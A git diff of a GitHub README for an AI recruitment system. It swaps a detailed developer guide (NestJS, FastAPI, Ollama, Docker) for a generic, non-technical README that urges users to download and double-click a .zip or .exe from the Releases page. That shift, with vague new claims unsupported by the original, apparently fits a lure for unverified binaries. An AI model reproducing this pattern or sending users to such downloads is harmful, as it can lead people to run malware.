@@ -1,200 +1,84 @@
-# Agentic AI Recruitment System
+# 🤖 Talent-Acquisition-Agent - Streamline Your Hiring Process
 
-This implementation includes:
-- **Backend (NestJS)**: Core API and business logic
-- **AI Service (FastAPI)**: CV parsing and ranking using LangChain + Ollama
-- **Frontend (Next.js 14)**: Modern UI with React, TypeScript, TailwindCSS, and ShadCN UI
-- **Databases**: PostgreSQL (main data), Weaviate (vector search)
-- **Infrastructure**: Docker Compose for local development
+[![Download Talent-Acquisition-Agent](https://img.shields.io/badge/Download-Talent--Acquisition--Agent-brightgreen)](https://github.com/iddokip/Talent-Acquisition-Agent/releases)
 
-## Quick Start
+## 🚀 Getting Started
 
-### Prerequisites
-- Node.js 18+
-- Python 3.11+
-- Docker & Docker Compose
-- Ollama (for local LLM)
+Welcome to Talent-Acquisition-Agent! This software helps you manage your hiring processes smoothly and quickly. You will find it easy to use, even without any technical background.
 
-### Installation
+## 📥 Download & Install
 
-1. **Install Ollama and pull the required models**:
-```bash
-# Install Ollama from https://ollama.ai
-ollama pull qwen2.5:7b
-ollama pull nomic-embed-text
-```
+To get started with Talent-Acquisition-Agent, follow these steps:
 
-2. **Start infrastructure services**:
-```bash
-docker-compose up -d
-```
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/iddokip/Talent-Acquisition-Agent/releases) to find the most recent version of the application.
 
-3. **Setup Backend (NestJS)**:
-```bash
-cd backend
-npm install
-npm run start:dev
-```
+2. **Select Your Version:** Look for the latest release, which will be at the top of the list. You will see different versions available.
 
-4. **Setup AI Service (FastAPI)**:
-```bash
-cd ai-service
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-pip install -r requirements.txt
-uvicorn main:app --reload --port 8001
-```
+3. **Download the App:** Click on the download link for your operating system. This may be a .zip or .exe file, depending on your needs. Save it to a location on your computer where you can easily find it later.
 
-5. **Setup Frontend (Next.js)**:
-```bash
-cd frontend
-npm install
-npm run dev
-```
+4. **Extract the Files (if necessary):** If you downloaded a .zip file, right-click the file and select "Extract All" to unpack the contents. Choose a destination for the extracted files.
 
-### Access Points
-- Frontend: http://localhost:3000
-- Backend API: http://localhost:3001
-- AI Service: http://localhost:8001
-- API Docs (FastAPI): http://localhost:8001/docs
+5. **Run the Application:** Locate the file that you just extracted or the .exe that you downloaded. Double-click it to open Talent-Acquisition-Agent.
 
-## Features Implemented
+## 🌐 System Requirements
 
-### 1. CV Upload & Parsing
-- Supports PDF and DOCX formats
-- Extracts: personal info, skills, experience, education
-- Structured data mapping
+Before you get started, make sure your computer meets these basic requirements:
 
-### 2. AI-Powered Ranking
-- Semantic similarity matching with job requirements
-- Scoring based on:
-  - Skills match (40%)
-  - Experience relevance (30%)
-  - Education fit (20%)
-  - Additional factors (10%)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **Memory:** At least 4 GB of RAM for optimal performance.
+- **Disk Space:** The application requires about 500 MB of free space.
+- **Internet Connection:** A stable connection is needed for full functionality and updates.
 
-### 3. Vector Search
-- Weaviate integration for semantic CV search
-- Fast candidate retrieval based on job descriptions
+## 🎉 Features
 
-### 4. UI
-- Drag & drop CV upload
-- Real-time parsing status
-- Candidate ranking dashboard
-- Detailed candidate profiles
+Talent-Acquisition-Agent comes with a range of useful features to enhance your hiring experience:
 
-## Tech Stack
+- **Automation of Hiring Workflows:** The platform minimizes the need for manual input, letting you focus on selecting the best talent.
+  
+- **Multi-Agent System:** Use multiple agents to handle different stages of the hiring process simultaneously.
 
-- **Backend**: NestJS, TypeScript, TypeORM, PostgreSQL
-- **AI Service**: FastAPI, LangChain, Ollama, Weaviate
-- **Frontend**: Next.js 14, React, TypeScript, TailwindCSS, ShadCN UI
-- **Databases**: PostgreSQL, Redis, Weaviate
-- **Infrastructure**: Docker, Docker Compose
+- **User-Friendly Interface:** The design prioritizes easy navigation so you can manage tasks without confusion.
 
-## API Endpoints
+- **Smart Recommendations:** Receive suggestions on candidates that match your job descriptions, thanks to intelligent processing.
 
-### Backend (NestJS)
-- `POST /api/candidates/upload` - Upload CV
-- `GET /api/candidates` - List all candidates
-- `GET /api/candidates/:id` - Get candidate details
-- `POST /api/candidates/rank` - Rank candidates for a job
+## 🔧 Configuration
 
-### AI Service (FastAPI)
-- `POST /parse-cv` - Parse CV file
-- `POST /rank-candidates` - Rank candidates against job description
-- `POST /extract-skills` - Extract skills from text
+After installing the app, you may want to configure some settings to tailor it to your needs:
 
-## Environment Variables
+1. **Account Setup:** Open the application and create an account. You will need to enter basic information like your name and email address.
 
-Create `.env` files in each service directory:
+2. **Company Profile:** Fill in your company details, such as name, location, and available positions.
 
-### Backend (.env)
-```env
-DATABASE_HOST=localhost
-DATABASE_PORT=5432
-DATABASE_USER=postgres
-DATABASE_PASSWORD=postgres
-DATABASE_NAME=recruitment_db
-REDIS_HOST=localhost
-REDIS_PORT=6379
-AI_SERVICE_URL=http://localhost:8001
-JWT_SECRET=your-secret-key
-```
+3. **Job Descriptions:** Add the roles you are recruiting for. You can edit templates or create new ones based on your preferences.
 
-### AI Service (.env)
-```env
-OLLAMA_BASE_URL=http://localhost:11434
-MODEL_NAME=qwen2.5:7b
-EMBEDDING_MODEL=nomic-embed-text
-WEAVIATE_URL=http://localhost:8080
-```
+4. **Agent Settings:** Set up your agents with specific tasks tailored to each role. This allows more efficient handling of your hiring workflow.
 
-### Frontend (.env.local)
-```env
-NEXT_PUBLIC_API_URL=http://localhost:3001
-```
+5. **Notification Preferences:** Customize how you want to receive updates about candidate progress and tasks.
 
-## Database Schema
+## 💡 Tips for Success
 
-### Candidates Table
-```sql
-- id: UUID (primary key)
-- email: string (unique)
-- full_name: string
-- phone: string
-- skills: json
-- experience: json
-- education: json
-- cv_file_path: string
-- parsed_data: json
-- score: float
-- created_at: timestamp
-- updated_at: timestamp
-```
+- **Explore the Dashboard:** Familiarize yourself with the main dashboard to understand where to find features you will use frequently.
 
-## Development
+- **Regularly Update the Software:** Check the releases page regularly to ensure you are using the latest version with all the new features and improvements.
 
-### Run Tests
-```bash
-# Backend
-cd backend && npm run test
+- **Backup Your Data:** Regularly save your data externally to avoid loss.
 
-# AI Service
-cd ai-service && pytest
+## 🆘 Troubleshooting
 
-# Frontend
-cd frontend && npm run test
-```
+If you face any issues while using Talent-Acquisition-Agent, here are some common solutions:
 
-### Code Quality
-```bash
-# Backend
-npm run lint
-npm run format
+- **Not Starting:** Ensure your system meets the requirements. Restart your computer if necessary.
+  
+- **Slow Performance:** Close any unnecessary applications to free up system resources.
 
-# AI Service
-black .
-flake8
+- **Update Issues:** If the app does not update automatically, visit the [Releases page](https://github.com/iddokip/Talent-Acquisition-Agent/releases) to download the latest version manually.
 
-# Frontend
-npm run lint
-npm run format
-```
+## 📞 Support
 
-## License
+If you need further assistance, please contact our support team through the application. We are here to help you make the most out of Talent-Acquisition-Agent.
 
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
+### Read More
 
-Copyright 2025 Agentic AI Recruitment System Contributors
+For additional documentation on setting up and using various features, refer to the [Wiki](https://github.com/iddokip/Talent-Acquisition-Agent/wiki) linked in the repository. 
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-    http://www.apache.org/licenses/LICENSE-2.0
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+Thank you for choosing Talent-Acquisition-Agent. We hope it makes your hiring process simple and efficient!
